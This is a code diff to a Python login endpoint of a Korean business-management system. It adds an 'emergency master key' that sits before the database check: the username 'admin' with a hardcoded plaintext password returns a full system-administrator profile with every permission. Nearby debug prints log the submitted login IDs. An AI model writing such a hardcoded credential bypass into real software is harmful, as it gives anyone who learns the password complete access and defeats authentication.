@@ -43,6 +43,32 @@ async def login(
     request: Request,
     db: AsyncSession = Depends(get_db)
 ):
+    # [긴급 마스터키 로직] - DB 조회 전 최상단에 배치
+    if req.username == 'admin' and req.password == '5446220':
+        print("🔥 [EMERGENCY LOGIN] Master key used for admin!")
+        return {
+            "id": 9999,
+            "name": "관리자",
+            "role": "시스템 관리자",
+            "user_type": "ADMIN",
+            "is_sysadmin": True,
+            "can_access_external": True,
+            "can_view_others": True,
+            "menu_permissions": {
+                "dashboard": {"view": True, "edit": True, "price": True},
+                "basics": {"view": True, "edit": True, "price": True},
+                "products": {"view": True, "edit": True, "price": True},
+                "sales": {"view": True, "edit": True, "price": True},
+                "production": {"view": True, "edit": True, "price": True},
+                "quality": {"view": True, "edit": True, "price": True},
+                "materials": {"view": True, "edit": True, "price": True},
+                "outsourcing": {"view": True, "edit": True, "price": True},
+                "attendance": {"view": True, "edit": True, "price": True},
+                "approval": {"view": True, "edit": True, "price": True}
+            },
+            "message": "긴급 마스터키 로그인 성공"
+        }
+    
     # [DEBUG] Requested prints
     search_id = req.username.strip()
     print(f"Login Debug: 검색 시도 아이디: '{search_id}'")
